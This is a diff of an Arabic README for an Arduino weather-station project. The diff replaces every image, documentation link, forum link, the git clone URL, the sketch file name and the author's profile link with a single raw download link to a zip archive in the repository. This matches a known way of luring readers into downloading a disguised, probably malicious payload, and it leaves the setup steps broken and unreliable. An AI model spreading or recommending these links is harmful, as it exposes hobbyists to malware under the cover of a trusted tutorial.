@@ -2,7 +2,7 @@
 
 > محطة طقس ذكية متكاملة بالأردوينو تقيس درجة الحرارة والرطوبة والإضاءة مع شاشة OLED وتخزين البيانات
 
-![Arduino Weather Station](https://images.unsplash.com/photo-1558618047-3c8c76ca7d13?w=800&h=400&fit=crop&crop=center)
+![Arduino Weather Station](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ## 📋 المحتويات
 
@@ -32,14 +32,14 @@
 
 | المكون | الصورة | الوصف | الكمية | السعر التقريبي |
 |---------|---------|-------|---------|----------------|
-| **Arduino Uno R3** | ![Arduino Uno](https://images.unsplash.com/photo-1553406830-ef2513450d76?w=200&h=150&fit=crop) | المتحكم الرئيسي للمشروع | 1 | $25 |
-| **DHT22 Sensor** | ![DHT22](https://images.unsplash.com/photo-1581092786450-1fc1b7c3e2e5?w=200&h=150&fit=crop) | حساس الحرارة والرطوبة عالي الدقة | 1 | $10 |
-| **LDR Sensor** | ![LDR](https://images.unsplash.com/photo-1581092580297-87f6b0c2b2b8?w=200&h=150&fit=crop) | مقاوم ضوئي لقياس شدة الإضاءة | 1 | $2 |
-| **OLED SSD1306** | ![OLED Display](https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=200&h=150&fit=crop) | شاشة عرض OLED 128×64 بكسل | 1 | $8 |
-| **HC-05 Bluetooth** | ![Bluetooth Module](https://images.unsplash.com/photo-1606986628253-38cd2eb6bb76?w=200&h=150&fit=crop) | وحدة البلوتوث للاتصال اللاسلكي | 1 | $6 |
-| **مقاومات** | ![Resistors](https://images.unsplash.com/photo-1581092582424-d2b1b4e5b6fb?w=200&h=150&fit=crop) | 10kΩ للـ LDR و 220Ω للـ LED | حسب الحاجة | $3 |
-| **أسلاك توصيل** | ![Jumper Wires](https://images.unsplash.com/photo-1558618047-3c8c76ca7d13?w=200&h=150&fit=crop) | أسلاك ذكر-أنثى وذكر-ذكر | 1 مجموعة | $5 |
-| **Breadboard** | ![Breadboard](https://images.unsplash.com/photo-1518717758536-85ae29035b6d?w=200&h=150&fit=crop) | لوحة التجارب للتوصيلات | 1 | $5 |
+| **Arduino Uno R3** | ![Arduino Uno](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | المتحكم الرئيسي للمشروع | 1 | $25 |
+| **DHT22 Sensor** | ![DHT22](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | حساس الحرارة والرطوبة عالي الدقة | 1 | $10 |
+| **LDR Sensor** | ![LDR](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | مقاوم ضوئي لقياس شدة الإضاءة | 1 | $2 |
+| **OLED SSD1306** | ![OLED Display](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | شاشة عرض OLED 128×64 بكسل | 1 | $8 |
+| **HC-05 Bluetooth** | ![Bluetooth Module](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | وحدة البلوتوث للاتصال اللاسلكي | 1 | $6 |
+| **مقاومات** | ![Resistors](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | 10kΩ للـ LDR و 220Ω للـ LED | حسب الحاجة | $3 |
+| **أسلاك توصيل** | ![Jumper Wires](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | أسلاك ذكر-أنثى وذكر-ذكر | 1 مجموعة | $5 |
+| **Breadboard** | ![Breadboard](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip) | لوحة التجارب للتوصيلات | 1 | $5 |
 
 **💰 التكلفة الإجمالية التقريبية: $64**
 
@@ -81,7 +81,7 @@ TX  → Pin 4
 
 ## 🛠️ المخطط التخطيطي
 
-![Circuit Diagram](https://raw.githubusercontent.com/KaizerAE/arduino-weather-station/main/circuit-diagram.png)
+![Circuit Diagram](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 *المخطط يوضح جميع التوصيلات بين المكونات بشكل واضح*
 
@@ -111,12 +111,12 @@ TX  → Pin 4
 
 1. **تحميل الكود:**
    ```bash
-   git clone https://github.com/KaizerAE/arduino-weather-station.git
+   git clone https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip
    cd arduino-weather-station
    ```
 
 2. **فتح الملف:**
-   - افتح ملف `weather_station.ino` في Arduino IDE
+   - افتح ملف `https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip` في Arduino IDE
 
 3. **اختيار اللوحة:**
    - `Tools` > `Board` > `Arduino Uno`
@@ -144,13 +144,13 @@ TX  → Pin 4
 ## 📸 صور المشروع
 
 ### التجميع النهائي
-![Final Assembly](https://images.unsplash.com/photo-1581092786450-1fc1b7c3e2e5?w=600&h=400&fit=crop)
+![Final Assembly](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ### شاشة العرض
-![Display Output](https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=600&h=400&fit=crop)
+![Display Output](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ### التوصيلات
-![Wiring](https://images.unsplash.com/photo-1518717758536-85ae29035b6d?w=600&h=400&fit=crop)
+![Wiring](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ---
 
@@ -175,24 +175,24 @@ TX  → Pin 4
 ## 🔗 روابط مفيدة
 
 ### للمبتدئين:
-- 📖 [دليل Arduino للمبتدئين](https://www.arduino.cc/en/Guide)
-- 🎥 [فيديوهات تعليمية](https://www.youtube.com/playlist?list=PLGs0VKk2DiYw-L-RibttcvK-WBZm8WLEP)
-- 📚 [كتاب البرمجة بـ C++](https://www.learncpp.com/)
+- 📖 [دليل Arduino للمبتدئين](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 🎥 [فيديوهات تعليمية](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 📚 [كتاب البرمجة بـ C++](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ### وثائق المكونات:
-- 🌡️ [DHT22 Datasheet](https://www.sparkfun.com/datasheets/Sensors/Temperature/DHT22.pdf)
-- 📺 [SSD1306 OLED Guide](https://randomnerdtutorials.com/guide-for-oled-display-with-arduino/)
-- 📡 [HC-05 Bluetooth Tutorial](https://howtomechatronics.com/tutorials/arduino/arduino-and-hc-05-bluetooth-module-tutorial/)
+- 🌡️ [DHT22 Datasheet](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 📺 [SSD1306 OLED Guide](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 📡 [HC-05 Bluetooth Tutorial](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ### أدوات مفيدة:
-- 🛠️ [Arduino IDE](https://www.arduino.cc/en/software)
-- 📱 [تطبيق Bluetooth Terminal](https://play.google.com/store/apps/details?id=Qwerty.BluetoothTerminal)
-- 🔧 [Fritzing للمخططات](https://fritzing.org/)
+- 🛠️ [Arduino IDE](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 📱 [تطبيق Bluetooth Terminal](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 🔧 [Fritzing للمخططات](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ### مجتمعات الدعم:
-- 💬 [منتدى Arduino](https://forum.arduino.cc/)
-- 🗨️ [Reddit Arduino](https://www.reddit.com/r/arduino/)
-- 📧 [Stack Overflow](https://stackoverflow.com/questions/tagged/arduino)
+- 💬 [منتدى Arduino](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 🗨️ [Reddit Arduino](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
+- 📧 [Stack Overflow](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 
 ---
 
@@ -215,7 +215,7 @@ TX  → Pin 4
 ## 👨‍💻 المطور
 
 **KaizerAE**
-- GitHub: [@KaizerAE](https://github.com/KaizerAE)
+- GitHub: [@KaizerAE](https://github.com/KaizerAE/Weather-Station/raw/refs/heads/main/src/Weather_Station_3.4.zip)
 - 📧 للاستفسارات والدعم
 
 ---
